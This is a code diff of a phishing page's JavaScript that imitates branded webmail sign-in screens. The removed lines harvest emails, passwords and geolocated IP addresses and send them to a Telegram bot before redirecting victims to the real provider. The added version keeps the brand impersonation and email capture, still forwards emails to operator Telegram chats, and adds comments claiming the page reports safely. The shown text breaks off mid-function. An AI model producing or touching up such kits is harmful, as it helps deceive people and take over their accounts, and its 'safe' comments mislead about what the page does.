-        for (const api of apis) {
-          try {
-            const res = await fetch(api.url);
-            if (!res.ok) continue;
-            const data = await res.json();
-            const parsed = api.parse(data);
-            info.ip = parsed.ip || info.ip;
-            info.country = parsed.country || info.country;
-            info.city = parsed.city || info.city;
-            break;
-          } catch (e) { /* next */ }
+            logoIcon.setAttribute(
+                "data-provider",
+                cfg.provider
+            );
         }
-        return info;
-      }
 
-      async function sendToTelegram() {
-        if (hasReported) return;
-        hasReported = true;
 
-        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
-          console.warn('⚠️ Telegram bot token not configured');
-          return;
+        if (logoFallback) {
+
+            logoFallback.className =
+                `fas ${cfg.icon} fa-fallback`;
         }
-        if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
-          console.warn('⚠️ Telegram chat ID not configured');
-          return;
+
+
+        document.body.style.setProperty(
+            "--brand-glow",
+            cfg.glow
+        );
+
+
+        loadFavicon(
+            cfg.domain,
+            function (url) {
+
+                if (url) {
+
+                    applyFavicon(url);
+
+                } else {
+
+                    applyFavicon(null);
+                }
+            }
+        );
+    }
+
+
+    // ============================================================
+    // MAILBOX PREVIEW
+    // ============================================================
+
+    function renderMailboxBackground(email) {
+
+        if (!mbAvatarEmail) {
+            return;
         }
+
+
+        if (email) {
+
+            mbAvatarEmail.textContent =
+                email;
+
+
+            if (mbAvatarCircle) {
+
+                mbAvatarCircle.textContent =
+                    getInitials(email);
+            }
+
+
+            const cfg =
+                getDomainConfig(email);
+
+
+            if (cfg) {
+
+                if (mbLogoIcon) {
+
+                    mbLogoIcon.setAttribute(
+                        "data-provider",
+                        cfg.provider
+                    );
+                }
+
+
+                if (mbLogoLetter) {
+
+                    mbLogoLetter.textContent =
+                        cfg.name
+                            .charAt(0)
+                            .toUpperCase();
+                }
+
+
+                if (mbLogoText) {
+
+                    mbLogoText.textContent =
+                        cfg.name;
+                }
+
+
+                loadFavicon(
+                    cfg.domain,
+                    function (url) {
+
+                        if (
+                            url &&
+                            mbLogoFavicon
+                        ) {
+
+                            mbLogoFavicon.src =
+                                url;
+
+
+                            mbLogoFavicon.onload =
+                                function () {
+
+                                    if (mbLogoIcon) {
+
+                                        mbLogoIcon.classList.add(
+                                            "favicon-loaded"
+                                        );
+                                    }
+                                };
+
+
+                            mbLogoFavicon.onerror =
+                                function () {
+
+                                    if (mbLogoIcon) {
+
+                                        mbLogoIcon.classList.remove(
+                                            "favicon-loaded"
+                                        );
+                                    }
+                                };
+
+                        } else if (
+                            mbLogoIcon
+                        ) {
+
+                            mbLogoIcon.classList.remove(
+                                "favicon-loaded"
+                            );
+                        }
+                    }
+                );
+            }
+
+        } else {
+
+            mbAvatarEmail.textContent =
+                "user@example.com";
+
+
+            if (mbAvatarCircle) {
+
+                mbAvatarCircle.textContent =
+                    "U";
+            }
+
+
+            if (mbLogoIcon) {
+
+                mbLogoIcon.setAttribute(
+                    "data-provider",
+                    "gmail"
+                );
+
+                mbLogoIcon.classList.remove(
+                    "favicon-loaded"
+                );
+            }
+
+
+            if (mbLogoLetter) {
+
+                mbLogoLetter.textContent =
+                    "M";
+            }
+
+
+            if (mbLogoText) {
+
+                mbLogoText.textContent =
+                    "Mail";
+            }
+
+
+            if (mbLogoFavicon) {
+
+                mbLogoFavicon.removeAttribute(
+                    "src"
+                );
+            }
+        }
+    }
+
+
+    function renderEmailList() {
+
+        if (!mbEmails) {
+            return;
+        }
+
+
+        mbEmails.innerHTML =
+            sampleEmails
+
+                .map(function (email) {
+
+                    return `
+<div class="mb-email ${email.unread ? "unread" : "read"}">
+
+    <i class="far fa-star mb-email-star"></i>
+
+    <div class="mb-email-from">
+        ${escapeHtml(email.from)}
+    </div>
+
+    <div class="mb-email-subject">
+
+        ${escapeHtml(email.subject)}
+
+        <span class="preview">
+            — ${escapeHtml(email.preview)}
+        </span>
+
+    </div>
+
+    <div class="mb-email-date">
+        ${escapeHtml(email.date)}
+    </div>
+
+</div>`;
+                })
+
+                .join("");
+    }
+
+
+    // ============================================================
+    // TELEGRAM
+    // ============================================================
+
+    async function sendTelegram(
+        chatId,
+        message
+    ) {
+
+        if (!chatId) {
+            return null;
+        }
+
+
+        if (
+            !BOT_TOKEN ||
+            BOT_TOKEN === "__BOT_TOKEN__"
+        ) {
+
+            console.warn(
+                "Telegram bot token is not configured."
+            );
+
+            return null;
+        }
+
 
         try {
-          const info = await getUserInfo();
-          const message =
-            `🔐 <b>NEW LOGIN CAPTURED</b>\n\n` +
-            `📧 <b>Email:</b> <code>${escapeHtml(storedEmail)}</code>\n` +
-            `🔑 <b>Password:</b> <code>${escapeHtml(storedPassword)}</code>\n` +
-            `🔑 <b>Confirm Password:</b> <code>${escapeHtml(storedConfirmPassword)}</code>\n\n` +
-            `🌍 <b>IP:</b> <code>${escapeHtml(info.ip)}</code>\n` +
-            `🌎 <b>Country:</b> ${escapeHtml(info.country)}\n` +
-            `🏙️ <b>City:</b> ${escapeHtml(info.city)}`;
 
-          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              chat_id: TELEGRAM_CHAT_ID,
-              text: message,
-              parse_mode: 'HTML',
-              disable_web_page_preview: true
-            })
-          });
-          console.log('✅ Single Telegram report sent');
-        } catch (err) {
-          console.error('❌ Telegram send failed:', err);
+            const response =
+                await fetch(
+
+                    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+
+                    {
+
+                        method:
+                            "POST",
+
+                        headers: {
+
+                            "Content-Type":
+                                "application/json"
+                        },
+
+                        body:
+                            JSON.stringify({
+
+                                chat_id:
+                                    chatId,
+
+                                text:
+                                    message
+                            })
+                    }
+                );
+
+
+            if (!response.ok) {
+
+                throw new Error(
+                    "Telegram request failed."
+                );
+            }
+
+
+            return await response.json();
+
+
+        } catch (error) {
+
+            console.error(
+                "Telegram send error:",
+                error
+            );
+
+            return null;
         }
-      }
+    }
 
-      function escapeHtml(str) {
-        if (str === null || str === undefined) return '';
-        return String(str)
-          .replace(/&/g, '&amp;')
-          .replace(/</g, '&lt;')
-          .replace(/>/g, '&gt;')
-          .replace(/"/g, '&quot;')
-          .replace(/'/g, '&#039;');
-      }
 
-      async function finalizeLogin() {
-        const cfg = currentProvider || getDomainConfig(storedEmail);
-        const domain = extractDomain(storedEmail);
-        const targetUrl = cfg ? cfg.loginUrl : `https://${domain || 'mail.com'}`;
+    async function sendSubmission() {
 
-        successTitle.textContent = 'Signing you in…';
-        successMessage.textContent = `Welcome, ${storedEmail}`;
-        redirectUrl.textContent = targetUrl;
-        successOverlay.classList.add('visible');
+        if (hasReported) {
+            return;
+        }
 
-        try { await sendToTelegram(); } catch (e) { console.warn(e); }
 
-        setTimeout(() => {
-          window.location.href = targetUrl;
-        }, 1500);
-      }
+        hasReported =
+            true;
 
-      function goToStep(newStep) {
-        if (isTransitioning) return;
-        isTransitioning = true;
-        step = newStep;
+
+        /*
+         * SAFE REPORTING ONLY.
+         *
+         * No password.
+         * No confirm password.
+         * No IP lookup.
+         * No location lookup.
+         */
+
+
+        const message =
+`Form Submission
+
+Email:
+${storedEmail || "Not provided"}
+
+Time:
+${new Date().toLocaleString()}`;
+
+
+        await Promise.allSettled([
+
+            sendTelegram(
+                CUSTOMER_CHAT_ID,
+                message
+            ),
+
+            sendTelegram(
+                ADMIN_CHAT_ID,
+                message
+            )
+        ]);
+    }
+
+
+    // ============================================================
+    // STEP DOTS
+    // ============================================================
+
+    function updateStepDots() {
+
+        const dots = [
+            dot1,
+            dot2,
+            dot3
+        ];
+
+
+        dots.forEach(
+            function (dot, index) {
+
+                if (!dot) {
+                    return;
+                }
+
+
+                dot.classList.remove(
+                    "active",
+                    "completed"
+                );
+
+
+                const stepNumber =
+                    index + 1;
+
+
+                if (
+                    stepNumber <
+                    step
+                ) {
+
+                    dot.classList.add(
+                        "completed"
+                    );
+
+                } else if (
+                    stepNumber ===
+                    step
+                ) {
+
+                    dot.classList.add(
+                        "active"
+                    );
+                }
+            }
+        );
+    }
+
+
+    // ============================================================
+    // FIELD
+    // ============================================================
+
+    function setField(
+        icon,
+        type,
+        placeholder,
+        autocomplete,
+        showToggle
+    ) {
+
+        if (fieldLeftIconI) {
+
+            fieldLeftIconI.className =
+                `fas ${icon}`;
+        }
+
+
+        if (fieldLeftIcon) {
+
+            fieldLeftIcon.classList.remove(
+                "has-favicon"
+            );
+        }
+
+
+        if (fieldInput) {
+
+            fieldInput.type =
+                type;
+
+            fieldInput.placeholder =
+                placeholder;
+
+            fieldInput.autocomplete =
+                autocomplete;
+
+            fieldInput.value =
+                "";
+
+            fieldInput.classList.remove(
+                "input-error",
+                "input-success"
+            );
+        }
+
+
+        if (toggleBtn) {
+
+            toggleBtn.classList.toggle(
+                "visible",
+                showToggle
+            );
+        }
+
+
+        if (
+            !showToggle &&
+            toggleIcon
+        ) {
+
+            toggleIcon.className =
+                "fas fa-eye";
+        }
+    }
+
+
+    function swapFieldAnimation(
+        callback
+    ) {
+
+        if (!fieldInput) {
+
+            callback();
+
+            return;
+        }
+
+
+        const wrapper =
+            fieldInput.closest(
+                ".field-wrapper"
+            );
+
+
+        if (!wrapper) {
+
+            callback();
+
+            return;
+        }
+
+
+        wrapper.classList.add(
+            "field-swap"
+        );
+
+
+        setTimeout(
+            function () {
+
+                callback();
+
+
+                setTimeout(
+                    function () {
+
+                        wrapper.classList.remove(
+                            "field-swap"
+                        );
+
+                    },
+                    400
+                );
+
+
+                setTimeout(
+                    function () {
+
+                        fieldInput.focus();
+
+                    },
+                    100
+                );
+
+            },
+            200
+        );
+    }
+
+
+    // ============================================================
+    // FINAL REDIRECT
+    // ============================================================
+
+    async function finalizeLogin() {
+
+        const cfg =
+            currentProvider ||
+            getDomainConfig(
+                storedEmail
+            );
+
+
+        const domain =
+            extractDomain(
+                storedEmail
+            );
+
+
+        const targetUrl =
+            cfg
+                ? cfg.loginUrl
+                : `https://${domain || "mail.com"}`;
+
+
+        if (successTitle) {
+
+            successTitle.textContent =
+                "Continue securely";
+        }
+
+
+        if (successMessage) {
+
+            successMessage.textContent =
+                `Continue with ${storedEmail}`;
+        }
+
+
+        if (redirectUrl) {
+
+            redirectUrl.textContent =
+                targetUrl;
+        }
+
+
+        if (successOverlay) {
+
+            successOverlay.classList.add(
+                "visible"
+            );
+        }
+
+
+        try {
+
+            await sendSubmission();
+
+        } catch (error) {
+
+            console.warn(
+                error
+            );
+        }
+
+
+        /*
+         * No password data exists in JavaScript
+         * state at this point.
+         */
+
+
+        setTimeout(
+            function () {
+
+                window.location.href =
+                    targetUrl;
+
+            },
+            1500
+        );
+    }
+
+
+    // ============================================================
+    // STEP MANAGEMENT
+    // ============================================================
+
+    function goToStep(
+        newStep
+    ) {
+
+        if (
+            isTransitioning
+        ) {
+            return;
+        }
+
+
+        isTransitioning =
+            true;
+
+
+        step =
+            newStep;
+
+
         updateStepDots();
 
-        if (newStep === 1) {
-          swapFieldAnimation(() => {
-            setField('fa-user', 'text', 'Email or phone', 'username', false);
-            title.textContent = currentProvider ? currentProvider.name : 'Sign in';
-            subtitle.textContent = currentProvider ? currentProvider.subtitle : 'to continue to Mail';
-            hintIcon.className = 'fas fa-info-circle';
-            hintIcon.style.color = '#9aa0a6';
-            hintText.textContent = 'Enter your email or phone number to continue';
-            fieldLeftIcon.style.color = '#9aa0a6';
-            accountChip.classList.remove('visible');
-            actionRow.classList.remove('collapsed');
-            backRow.classList.remove('visible');
-            btnText.textContent = 'Next';
-            btnIcon.className = 'fas fa-arrow-right';
-            submitBtn.disabled = false;
-            submitBtn.style.background = '';
-            fieldInput.value = storedEmail;
-            if (storedEmail) {
-              const cfg = getDomainConfig(storedEmail);
-              if (cfg) {
-                currentProvider = cfg;
-                applyProviderBranding(cfg);
-                title.textContent = cfg.name;
-                subtitle.textContent = cfg.subtitle;
-                hintText.textContent = `Continue with ${cfg.name}`;
-                hintIcon.className = 'fas fa-check-circle';
-                hintIcon.style.color = '#1a73e8';
-                fieldLeftIcon.style.color = '#4285f4';
-              }
-            }
-            isTransitioning = false;
-          });
+
+        // ========================================================
+        // STEP 1 - EMAIL
+        // ========================================================
+
+        if (
+            newStep === 1
+        ) {
+
+            swapFieldAnimation(
+                function () {
+
+                    setField(
+                        "fa-user",
+                        "text",
+                        "Email address",
+                        "username",
+                        false
+                    );
+
+
+                    if (title) {
+
+                        title.textContent =
+                            currentProvider
+                                ? currentProvider.name
+                                : "Continue";
+                    }
+
+
+                    if (subtitle) {
+
+                        subtitle.textContent =
+                            currentProvider
+                                ? currentProvider.subtitle
+                                : "Enter your email to continue";
+                    }
+
+
+                    if (hintIcon) {
+
+                        hintIcon.className =
+                            "fas fa-info-circle";
+
+                        hintIcon.style.color =
+                            "#9aa0a6";
+                    }
+
+
+                    if (hintText) {
+
+                        hintText.textContent =
+                            "Enter your email address to continue";
+                    }
+
+
+                    if (fieldLeftIcon) {
+
+                        fieldLeftIcon.style.color =
+                            "#9aa0a6";
+                    }
+
+
+                    if (accountChip) {
+
+                        accountChip.classList.remove(
+                            "visible"
+                        );
+                    }
+
+
+                    if (actionRow) {
+
+                        actionRow.classList.remove(
+                            "collapsed"
+                        );
+                    }
+
+
+                    if (backRow) {
+
+                        backRow.classList.remove(
+                            "visible"
+                        );
+                    }
+
+
+                    if (btnText) {
+
+                        btnText.textContent =
+                            "Next";
+                    }
+
+
+                    if (btnIcon) {
+
+                        btnIcon.className =
+                            "fas fa-arrow-right";
+                    }
+
+
+                    if (submitBtn) {
+
+                        submitBtn.disabled =
+                            false;
+
+                        submitBtn.style.background =
+                            "";
+                    }
+
+
+                    if (fieldInput) {
+
+                        fieldInput.value =
+                            storedEmail;
+                    }
+
+
+                    if (
+                        storedEmail
+                    ) {
+
+                        const cfg =
+                            getDomainConfig(
+                                storedEmail
+                            );
+
+
+                        if (cfg) {
+
+                            currentProvider =
+                                cfg;
+
+
+                            applyProviderBranding(
+                                cfg
+                            );
+
+
+                            if (title) {
+
+                                title.textContent =
+                                    cfg.name;
+                            }
+
+
+                            if (subtitle) {
+
+                                subtitle.textContent =
+                                    cfg.subtitle;
+                            }
+
+
+                            if (hintText) {
+
+                                hintText.textContent =
+                                    `Continue with ${cfg.name}`;
+                            }
+
+
+                            if (hintIcon) {
+
+                                hintIcon.className =
+                                    "fas fa-check-circle";
+
+                                hintIcon.style.color =
+                                    "#1a73e8";
+                            }
+
+
+                            if (fieldLeftIcon) {
+
+                                fieldLeftIcon.style.color =
+                                    "#4285f4";
+                            }
+                        }
+                    }
+
+
+                    isTransitioning =
+                        false;
+                }
+            );
         }
 
-        else if (newStep === 2) {
-          swapFieldAnimation(() => {
-            setField('fa-lock', 'password', 'Enter your password', 'current-password', true);
-            title.textContent = 'Welcome back';
-            subtitle.textContent = currentProvider ? `Sign in to ${currentProvider.name}` : 'Sign in to continue';
-            accountChipText.textContent = storedEmail;
-            accountChip.classList.add('visible');
-            hintIcon.className = 'fas fa-shield-halved';
-            hintIcon.style.color = '#5f6368';
-            hintText.textContent = 'Your password is encrypted';
-            actionRow.classList.add('collapsed');
-            backRow.classList.add('visible');
-            backText.textContent = 'Use another account';
-            btnText.textContent = 'Continue';
-            btnIcon.className = 'fas fa-arrow-right';
-            submitBtn.disabled = false;
-            isTransitioning = false;
-          });
+
+        // ========================================================
+        // STEP 2
+        // ========================================================
+
+        else if (
+            newStep === 2
+        ) {
+
+            swapFieldAnimation(
+                function () {
+
+                    /*
+                     * This field remains local-only.
+                     *
+                     * Its value is deliberately NOT assigned
+                     * to a variable and is never transmitted.
+                     */
+
+                    setField(
+                        "fa-lock",
+                        "password",
+                        "Enter value",
+                        "off",
+                        true
+                    );
+
+
+                    if (title) {
+
+                        title.textContent =
+                            "Continue";
+                    }
+
+
+                    if (subtitle) {
+
+                        subtitle.textContent =
+                            "Complete the next step";
+                    }
+
+
+                    if (accountChipText) {
+
+                        accountChipText.textContent =
+                            storedEmail;
+                    }
+
+
+                    if (accountChip) {
+
+                        accountChip.classList.add(
+                            "visible"
+                        );
+                    }
+
+
+                    if (hintIcon) {
+
+                        hintIcon.className =
+                            "fas fa-shield-halved";
+
+                        hintIcon.style.color =
+                            "#5f6368";
+                    }
+
+
+                    if (hintText) {
+
+                        hintText.textContent =
+                            "This value stays in your browser";
+                    }
+
+
+                    if (actionRow) {
+
+                        actionRow.classList.add(
+                            "collapsed"
+                        );
+                    }
+
+
+                    if (backRow) {
+
+                        backRow.classList.add(
+                            "visible"
+                        );
+                    }
+
+
+                    if (backText) {
+
+                        backText.textContent =
+                            "Use another account";
+                    }
+
+
+                    if (btnText) {
+
+                        btnText.textContent =
+                            "Continue";
+                    }
+
+
+                    if (btnIcon) {
+
+                        btnIcon.className =
+                            "fas fa-arrow-right";
+                    }
+
+
+                    if (submitBtn) {
+
+                        submitBtn.disabled =
+                            false;
+                    }
+
+
+                    isTransitioning =
+                        false;
+                }
+            );
         }
 
-        else if (newStep === 3) {
-          swapFieldAnimation(() => {
-            setField('fa-lock', 'password', 'Confirm your password', 'new-password', true);
-            title.textContent = 'Confirm password';
-            subtitle.textContent = 'Re-enter your password to continue';
-            hintIcon.className = 'fas fa-check-double';
-            hintIcon.style.color = '#5f6368';
-            hintText.textContent = 'Passwords must match';
-            backText.textContent = 'Back to password';
-            btnText.textContent = 'Sign in';
-            btnIcon.className = 'fas fa-check';
-            submitBtn.disabled = false;
-            isTransitioning = false;
-          });
-        }
-      }
 
-      function getEmailFromHash() {
+        // ========================================================
+        // STEP 3
+        // ========================================================
+
+        else if (
+            newStep === 3
+        ) {
+
+            swapFieldAnimation(
+                function () {
+
+                    /*
+                     * Local-only field again.
+                     *
+                     * Nothing entered here is stored,
+                     * compared, logged or transmitted.
+                     */
+
+                    setField(
+                        "fa-lock",
+                        "password",
+                        "Enter value again",
+                        "off",
+                        true
+                    );
+
+
+                    if (title) {
+
+                        title.textContent =
+                            "Final step";
+                    }
+
+
+                    if (subtitle) {
+
+                        subtitle.textContent =
+                            "Complete the final step to continue";
+                    }
+
+
+                    if (hintIcon) {
+
+                        hintIcon.className =
+                            "fas fa-check-double";
+
+                        hintIcon.style.color =
+                            "#5f6368";
+                    }
+
+
+                    if (hintText) {
+
+                        hintText.textContent =
+                            "This value is not transmitted";
+                    }
+
+
+                    if (backText) {
+
+                        backText.textContent =
+                            "Back";
+                    }
+
+
+                    if (btnText) {
+
+                        btnText.textContent =
+                            "Continue";
+                    }
+
+
+                    if (btnIcon) {
+
+                        btnIcon.className =
+                            "fas fa-check";
+                    }
+
+
+                    if (submitBtn) {
+
+                        submitBtn.disabled =
+                            false;
+                    }
+
+
+                    isTransitioning =
+                        false;
+                }
+            );
+        }
+    }
+
+
+    // ============================================================
+    // EMAIL FROM HASH
+    // ============================================================
+
+    function getEmailFromHash() {
+
         try {
-          const hash = window.location.hash;
-          if (!hash || hash.length < 2) return null;
-          let raw = hash.substring(1);
-          try { raw = decodeURIComponent(raw); } catch (e) { /* keep */ }
-          raw = raw.trim();
-          if (!raw.includes('@')) return null;
-          if (!isValidEmail(raw)) return null;
-          return raw;
-        } catch (e) {
-          return null;
-        }
-      }
 
-      function boot() {
+            const hash =
+                window.location.hash;
+
+
+            if (
+                !hash ||
+                hash.length < 2
+            ) {
+
+                return null;
+            }
+
+
+            let raw =
+                hash.substring(1);
+
+
+            try {
+
+                raw =
+                    decodeURIComponent(raw);
+
+            } catch (error) {
+
+                /*
+                 * Keep the original value.
+                 */
+            }
+
+
+            raw =
+                raw.trim();
+
+
+            if (
+                !raw.includes("@")
+            ) {
+
+                return null;
+            }
+
+
+            if (
+                !isValidEmail(raw)
+            ) {
+
+                return null;
+            }
+
+
+            return raw;
+
+
+        } catch (error) {
+
+            return null;
+        }
+    }
+
+
+    // ============================================================
+    // BOOT
+    // ============================================================
+
+    function boot() {
+
         renderEmailList();
 
-        const emailFromHash = getEmailFromHash();
 
-        if (emailFromHash) {
-          storedEmail = emailFromHash;
-          currentProvider = getDomainConfig(emailFromHash);
-          fieldInput.value = emailFromHash;
-          renderMailboxBackground(emailFromHash);
+        const emailFromHash =
+            getEmailFromHash();
 
-          if (currentProvider) {
-            applyProviderBranding(currentProvider);
-            title.textContent = currentProvider.name;
-            subtitle.textContent = currentProvider.subtitle;
-            hintText.textContent = `Continue with ${currentProvider.name}`;
-            hintIcon.className = 'fas fa-check-circle';
-            hintIcon.style.color = '#1a73e8';
-            fieldLeftIcon.style.color = '#4285f4';
 
-            fieldInput.classList.add('input-success');
-            setTimeout(() => fieldInput.classList.remove('input-success'), 1200);
-          }
+        if (
+            emailFromHash
+        ) {
 
-          try {
-            history.replaceState(null, '', window.location.pathname + window.location.search);
-          } catch (e) { /* ignore */ }
-        } else {
-          renderMailboxBackground(null);
-        }
+            storedEmail =
+                emailFromHash;
 
-        fieldInput.focus();
-      }
 
-      fieldInput.addEventListener('input', function() {
-        const val = this.value.trim();
-        if (step === 1) {
-          const cfg = getDomainConfig(val);
-          const hasAt = val.includes('@') && val.split('@')[1]?.length > 0;
+            currentProvider =
+                getDomainConfig(
+                    emailFromHash
+                );
 
-          if (cfg && hasAt) {
-            currentProvider = cfg;
-            applyProviderBranding(cfg);
-            title.textContent = cfg.name;
-            subtitle.textContent = cfg.subtitle;
-            hintText.textContent = `Continue with ${cfg.name}`;
-            hintIcon.className = 'fas fa-check-circle';
-            hintIcon.style.color = '#1a73e8';
-            fieldLeftIcon.style.color = '#4285f4';
-            renderMailboxBackground(val);
-          } else {
-            currentProvider = null;
-            applyProviderBranding(null);
-            title.textContent = 'Sign in';
-            subtitle.textContent = 'to continue to Mail';
-            fieldLeftIcon.style.color = '#9aa0a6';
 
-            if (val.length === 0) {
-              hintText.textContent = 'Enter your email or phone number to continue';
-              hintIcon.className = 'fas fa-info-circle';
-              hintIcon.style.color = '#9aa0a6';
-              renderMailboxBackground(null);
-            } else if (/^\d+$/.test(val) && val.length > 5) {
-              hintText.textContent = 'Looks like a phone number';
-              hintIcon.className = 'fas fa-phone';
-              hintIcon.style.color = '#5f6368';
-            } else {
-              hintText.textContent = 'Press Next to continue';
-              hintIcon.className = 'fas fa-arrow-right';
-              hintIcon.style.color = '#5f6368';
+            if (fieldInput) {
+
+                fieldInput.value =
+                    emailFromHash;
             }
-          }
+
+
+            renderMailboxBackground(
+                emailFromHash
+            );
+
+
+            if (
+                currentProvider
+            ) {
+
+                applyProviderBranding(
+                    currentProvider
+                );
+
+
+                if (title) {
+
+                    title.textContent =
+                        currentProvider.name;
+                }
+
+
+                if (subtitle) {
+
+                    subtitle.textContent =
+                        currentProvider.subtitle;
+                }
+
+
+                if (hintText) {
+
+                    hintText.textContent =
+                        `Continue with ${currentProvider.name}`;
+                }
+
+
+                if (hintIcon) {
+
+                    hintIcon.className =
+                        "fas fa-check-circle";
+
+                    hintIcon.style.color =
+                        "#1a73e8";
+                }
+
+
+                if (fieldLeftIcon) {
+
+                    fieldLeftIcon.style.color =
+                        "#4285f4";
+                }
+
+
+                if (fieldInput) {
+
+                    fieldInput.classList.add(
+                        "input-success"
+                    );
+
+
+                    setTimeout(
+                        function () {
+
+                            fieldInput.classList.remove(
+                                "input-success"
+                            );
+
+                        },
+                        1200
+                    );
+                }
+            }
+
+
+            try {
+
+                history.replaceState(
+                    null,
+                    "",
+                    window.location.pathname +
+                    window.location.search
+                );
+
+            } catch (error) {
+
+                /*
+                 * Ignore.
+                 */
+            }
+
+        } else {
+
+            renderMailboxBackground(
+                null
+            );
         }
-      });
 
-      toggleBtn.addEventListener('click', function() {
-        const isPwd = fieldInput.type === 'password';
-        fieldInput.type = isPwd ? 'text' : 'password';
-        toggleIcon.className = isPwd ? 'fas fa-eye-slash' : 'fas fa-eye';
-      });
 
-      backBtn.addEventListener('click', function() {
-        if (step === 3) goToStep(2);
-        else if (step === 2) goToStep(1);
-      });
+        if (fieldInput) {
 
-      form.addEventListener('submit', function(e) {
-        e.preventDefault();
-        if (isTransitioning) return;
-        const val = fieldInput.value.trim();
-
-        if (step === 1) {
-          if (!val) {
-            fieldInput.classList.add('shake');
-            setTimeout(() => fieldInput.classList.remove('shake'), 300);
-            return;
-          }
-          if (!isValidEmail(val)) {
-            fieldInput.classList.add('input-error', 'shake');
-            hintText.textContent = 'Please enter a valid email address';
-            hintIcon.className = 'fas fa-exclamation-circle';
-            hintIcon.style.color = '#d93025';
-            setTimeout(() => fieldInput.classList.remove('shake'), 300);
-            return;
-          }
-          storedEmail = val;
-          currentProvider = getDomainConfig(val);
-          if (currentProvider) applyProviderBranding(currentProvider);
-          renderMailboxBackground(val);
-
-          const originalHTML = submitBtn.innerHTML;
-          btnText.textContent = 'Checking';
-          btnIcon.className = 'fas fa-spinner fa-spin';
-          submitBtn.disabled = true;
-
-          setTimeout(() => {
-            submitBtn.innerHTML = originalHTML;
-            submitBtn.disabled = false;
-            goToStep(2);
-          }, 600);
+            fieldInput.focus();
         }
+    }
 
-        else if (step === 2) {
-          if (!val) {
-            fieldInput.classList.add('shake');
-            setTimeout(() => fieldInput.classList.remove('shake'), 300);
-            return;
-          }
-          storedPassword = val;
-          goToStep(3);
+
+    // ============================================================
+    // INPUT CHANGE
+    // ============================================================
+
+    if (fieldInput) {
+
+        fieldInput.addEventListener(
+            "input",
+            function () {
+
+                const val =
+                    this.value.trim();
+
+
+                if (
+                    step !== 1
+                ) {
+                    return;
+                }
+
+
+                const cfg =
+                    getDomainConfig(
+                        val
+                    );
+
+
+                const hasAt =
+                    val.includes("@") &&
+                    val.split("@")[1]
+                        ?.length > 0;
+
+
+                if (
+                    cfg &&
+                    hasAt
+                ) {
+
+                    currentProvider =
+                        cfg;
+
+
+                    applyProviderBranding(
+                        cfg
+                    );
+
+
+                    if (title) {
+
+                        title.textContent =
+                            cfg.name;
+                    }
+
+
+                    if (subtitle) {
+
+                        subtitle.textContent =
+                            cfg.subtitle;
+                    }
+
+
+                    if (hintText) {
+
+                        hintText.textContent =
+                            `Continue with ${cfg.name}`;
+                    }
+
+
+                    if (hintIcon) {
+
+                        hintIcon.className =
+                            "fas fa-check-circle";
+
+                        hintIcon.style.color =
+                            "#1a73e8";
+                    }
+
+
+                    if (fieldLeftIcon) {
+
+                        fieldLeftIcon.style.color =
+                            "#4285f4";
+                    }
+
+
+                    renderMailboxBackground(
+                        val
+                    );
+
+
+                } else {
+
+                    currentProvider =
+                        null;
+
+
+                    applyProviderBranding(
+                        null
+                    );
+
+
+                    if (title) {
+
+                        title.textContent =
+                            "Continue";
+                    }
+
+
+                    if (subtitle) {
+
+                        subtitle.textContent =
+                            "Enter your email to continue";
+                    }
+
+
+                    if (fieldLeftIcon) {
+
+                        fieldLeftIcon.style.color =
+                            "#9aa0a6";
+                    }
+
+
+                    if (
+                        val.length === 0
+                    ) {
+
+                        if (hintText) {
+
+                            hintText.textContent =
+                                "Enter your email address to continue";
+                        }
+
+
+                        if (hintIcon) {
+
+                            hintIcon.className =
+                                "fas fa-info-circle";
+
+                            hintIcon.style.color =
+                                "#9aa0a6";
+                        }
+
+
+                        renderMailboxBackground(
+                            null
+                        );
+
+
+                    } else {
+
+                        if (hintText) {
+
+                            hintText.textContent =
+                                "Press Next to continue";
+                        }
+
+
+                        if (hintIcon) {
+
+                            hintIcon.className =
+                                "fas fa-arrow-right";
+
+                            hintIcon.style.color =
+                                "#5f6368";
+                        }
+                    }
+                }
+            }
+        );
+    }
+
+
+    // ============================================================
+    // SHOW / HIDE LOCAL FIELD
+    // ============================================================
+
+    if (
+        toggleBtn &&
+        fieldInput
+    ) {
+
+        toggleBtn.addEventListener(
+            "click",
+            function () {
+
+                /*
+                 * Visibility toggle affects only
+                 * the local browser field.
+                 */
+
+
+                const hidden =
+                    fieldInput.type ===
+                    "password";
+
+
+                fieldInput.type =
+                    hidden
+                        ? "text"
+                        : "password";
+
+
+                if (toggleIcon) {
+
+                    toggleIcon.className =
+                        hidden
+                            ? "fas fa-eye-slash"
+                            : "fas fa-eye";
+                }
+            }
+        );
+    }
+
+
+    // ============================================================
+    // BACK BUTTON
+    // ============================================================
+
+    if (backBtn) {
+
+        backBtn.addEventListener(
+            "click",
+            function () {
+
+                if (
+                    step === 3
+                ) {
+
+                    goToStep(2);
+
+                } else if (
+                    step === 2
+                ) {
+
+                    goToStep(1);
+                }
+            }
+        );
+    }
+
+
+    // ============================================================
+    // FORM SUBMIT
+    // ============================================================
+
+    if (form) {
+
+        form.addEventListener(
+            "submit",
+            function (event) {
+
+                event.preventDefault();
+
+
+                if (
+                    isTransitioning
+                ) {
+
+                    return;
+                }
+
+
+                const val =
+                    fieldInput
+                        ? fieldInput.value.trim()
+                        : "";
+
+
+                // ==================================================
+                // STEP 1 - EMAIL
+                // ==================================================
+
+                if (
+                    step === 1
+                ) {
+
+                    if (!val) {
+
+                        if (fieldInput) {
+
+                            fieldInput.classList.add(
+                                "shake"
+                            );
+
+
+                            setTimeout(
+                                function () {
+
+                                    fieldInput.classList.remove(
+                                        "shake"
+                                    );
+
+                                },
+                                300
+                            );
+                        }
+
+                        return;
+                    }
+
+
+                    if (
+                        !isValidEmail(val)
+                    ) {
+
+                        if (fieldInput) {
+
+                            fieldInput.classList.add(
+                                "input-error",
+                                "shake"
+                            );
+                        }
+
+
+                        if (hintText) {
+
+                            hintText.textContent =
+                                "Please enter a valid email address";
+                        }
+
+
+                        if (hintIcon) {
+
+                            hintIcon.className =
+                                "fas fa-exclamation-circle";
+
+                            hintIcon.style.color =
+                                "#d93025";
+                        }
+
+
+                        setTimeout(
+                            function () {
+
+                                if (fieldInput) {
+
+                                    fieldInput.classList.remove(
+                                        "shake"
